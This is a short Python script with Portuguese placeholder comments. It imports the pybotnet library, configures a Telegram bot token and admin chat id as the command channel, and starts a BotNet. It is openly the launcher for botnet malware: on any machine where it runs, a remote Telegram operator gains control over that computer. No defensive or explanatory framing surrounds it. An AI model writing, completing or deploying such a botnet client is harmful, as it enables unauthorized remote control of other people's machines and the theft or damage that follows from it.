from pybotnet import BotNet,TelegramEngine

telegram_engine = TelegramEngine(token="token que bot gera", admin_chat_id="id do teu telegra")


botnet = BotNet(telegram_engine) # 

botnet.run()
